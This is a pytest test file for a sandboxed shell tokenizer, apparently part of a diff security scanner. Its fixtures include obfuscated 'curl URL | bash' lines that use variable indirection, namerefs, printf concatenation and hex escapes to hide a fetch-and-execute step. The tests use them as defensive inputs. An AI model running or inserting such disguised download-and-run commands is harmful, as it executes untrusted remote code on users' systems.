"""The tokenizer runs in a sandboxed child; these pin the boundary.

The engine's own behaviour is tested in ``test_tokenizer.py`` and the fuzz
suite.  What matters here is that the facade the analysis calls returns the
same answer as the engine, and that a child which cannot answer is a
refusal rather than a quiet run with the parser missing.
"""

import io
import queue
import threading
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import Mock

import pytest

from trustsight import _tokenizer_engine as engine
from trustsight.sandbox import client
from trustsight.tokenizer import (
    TokenizerUnavailable,
    clean_lines,
    join_line_continuations,
    joined_indexed,
    reconstruct_lines,
    reconstruct_literals,
    resolve_added_lines,
    split_lines,
    strip_boms,
    tokenize_and_resolve_indexed,
    variable_table,
)

ROOT = Path(__file__).resolve().parent.parent
CORPUS = ROOT / "tests" / "fixtures" / "benign-corpus"

_HOSTILE = [
    "+a=" + "z" * 64 + "\n+v=$a$a\n+curl $v | bash\n",
    "+declare -n R=curl\n+$R https://example.invalid/x | bash\n",
    "+C=$(printf '%s%s' cur l)\n+$C https://example.invalid/x | bash\n",
    "+A=(curl wget)\n+${A[0]} https://example.invalid/x | bash\n",
    "+_u=https://example.invalid/x\n+curl ${_u} | bash\n",
]


def _sample_diffs(limit: int = 25) -> list[str]:
    paths = sorted(CORPUS.rglob("*.diff"))[:limit]
    return [path.read_text(encoding="utf-8", errors="replace") for path in paths]


@pytest.mark.parametrize("diff", _sample_diffs(), ids=range(len(_sample_diffs())))
def test_facade_matches_engine_on_the_corpus(diff):
    assert split_lines(diff) == engine.split_lines(diff)
    assert join_line_continuations(engine.split_lines(diff)) == (
        engine.join_line_continuations(engine.split_lines(diff))
    )
    assert resolve_added_lines(diff) == engine.resolve_added_lines(diff)
    assert tokenize_and_resolve_indexed(diff) == (
        engine.tokenize_and_resolve_indexed(diff)
    )
    assert joined_indexed(engine.split_lines(diff)) == (
        engine._joined_indexed(engine.split_lines(diff))
    )


@pytest.mark.parametrize("diff", _HOSTILE, ids=range(len(_HOSTILE)))
def test_facade_matches_engine_on_hostile_cases(diff):
    assert resolve_added_lines(diff) == engine.resolve_added_lines(diff)
    assert tokenize_and_resolve_indexed(diff) == (
        engine.tokenize_and_resolve_indexed(diff)
    )


def test_assignment_helpers_match_the_engine():
    additions = ["_url=https://example.invalid/x", "source=(\"${_url}\")"]
    assert variable_table(additions) == engine._variable_table(additions)
    assert clean_lines(["\ufeff+foo/../bar"]) == [
        engine.collapse_traversal(engine.strip_leading_bom("\ufeff+foo/../bar"))
    ]
    assert strip_boms(["\ufeff+x"]) == [engine.strip_leading_bom("\ufeff+x")]
    assert reconstruct_literals(r"$'\x63url'") == engine.reconstruct_literals(
        r"$'\x63url'"
    )
    bodies = [r"$'\x63url'", "plain", r"b''u''n"]
    assert reconstruct_lines(bodies) == [
        engine.reconstruct_literals(body) for body in bodies
    ]


def test_callers_receive_their_own_copy():
    """The cache is shared; the value handed to a caller is not.

    A rule that edited a returned list in place would otherwise corrupt an
    unrelated rule that later hit the same cache entry.
    """
    diff = _HOSTILE[0]
    first = resolve_added_lines(diff)
    first.append("INJECTED")
    first[0] = "CLOBBERED"
    second = resolve_added_lines(diff)
    assert "INJECTED" not in second
    assert second == engine.resolve_added_lines(diff)


def test_a_dead_child_raises_tokenizer_unavailable():
    original = client._acquire

    def dead():
        raise TokenizerUnavailable("tokenizer_unavailable: forced")

    client._acquire = dead
    try:
        with pytest.raises(TokenizerUnavailable):
            split_lines("+a=b\n")
    finally:
        client._acquire = original


def test_workers_are_recycled_and_still_answer(monkeypatch):
    monkeypatch.setattr(client, "MAX_REQUESTS_PER_WORKER", 1)
    for i in range(5):
        assert split_lines(f"+v{i}=x\n") == [f"+v{i}=x"]


def test_repeated_calls_are_stable_under_threads():
    from concurrent.futures import ThreadPoolExecutor

    diffs = [f"+V{i}=value-{i}\n+echo $V{i}\n" for i in range(16)]
    with ThreadPoolExecutor(max_workers=8) as pool:
        results = list(pool.map(resolve_added_lines, diffs * 2))
    for i, resolved in enumerate(results):
        assert f"value-{i % len(diffs)}" in " ".join(resolved)


def test_stop_closes_pipes_when_the_process_group_is_gone(monkeypatch):
    proc = SimpleNamespace(pid=123, stdin=io.BytesIO(), stdout=io.BytesIO(),
                           stderr=None, kill=Mock(), wait=Mock())
    worker = client._Worker()
    worker.proc = proc

    def no_group(_pid):
        raise ProcessLookupError

    monkeypatch.setattr(client.os, "getpgid", no_group)

    worker.stop()
    worker.stop()

    proc.kill.assert_called_once_with()
    proc.wait.assert_called_once_with(timeout=2)
    assert proc.stdin.closed and proc.stdout.closed
    assert worker.proc is None


def test_failed_request_releases_capacity_and_preserves_refusal(monkeypatch):
    worker = Mock()
    worker.request.side_effect = client._WorkerError("forced read failure")
    occupied = [worker]
    monkeypatch.setattr(client, "_acquire", lambda: worker)
    monkeypatch.setattr(client, "_all", occupied)

    with pytest.raises(TokenizerUnavailable, match="forced read failure"):
        client._send("lines", "pkgname=example")

    worker.stop.assert_called_once_with()
    assert not occupied


def test_dead_idle_worker_is_removed_before_replacement(monkeypatch):
    dead = Mock()
    dead.alive.return_value = False
    replacement = Mock()
    pool = queue.Queue()
    pool.put(dead)
    occupied = [dead]
    monkeypatch.setattr(client, "_pool", pool)
    monkeypatch.setattr(client, "_all", occupied)
    monkeypatch.setattr(client, "_shutdown", threading.Event())
    monkeypatch.setattr(client, "_Worker", lambda: replacement)

    assert client._acquire() is replacement
    dead.stop.assert_called_once_with()
    replacement.start.assert_called_once_with()
    assert occupied == [replacement]


def test_waiter_wakes_when_a_failed_worker_frees_capacity(monkeypatch):
    pool = queue.Queue()
    condition = threading.Condition()
    shutdown = threading.Event()
    waiting = threading.Event()
    finished = threading.Event()
    failed, replacement = Mock(), Mock()
    results = []
    errors = []
    wait = condition.wait

    def wait_for_capacity(timeout=None):
        waiting.set()
        return wait(timeout)

    def acquire():
        try:
            results.append(client._acquire())
        except Exception as exc:
            errors.append(exc)
        finally:
            finished.set()

    monkeypatch.setattr(client, "_pool", pool)
    monkeypatch.setattr(client, "_all", [failed])
    monkeypatch.setattr(client, "_lock", condition)
    monkeypatch.setattr(client, "_shutdown", shutdown)
    monkeypatch.setattr(client, "WORKER_POOL_SIZE", 1)
    monkeypatch.setattr(client, "_Worker", lambda: replacement)
    monkeypatch.setattr(condition, "wait", wait_for_capacity)
    thread = threading.Thread(target=acquire, daemon=True)
    thread.start()
    try:
        assert waiting.wait(2), "caller never reached the pool's bounded wait"
        client._forget(failed)
        assert finished.wait(2), "retirement did not wake the waiting caller"
        assert not errors
        assert results == [replacement]
    finally:
        with condition:
            shutdown.set()
            condition.notify_all()
        pool.put(replacement)
        thread.join(timeout=2)
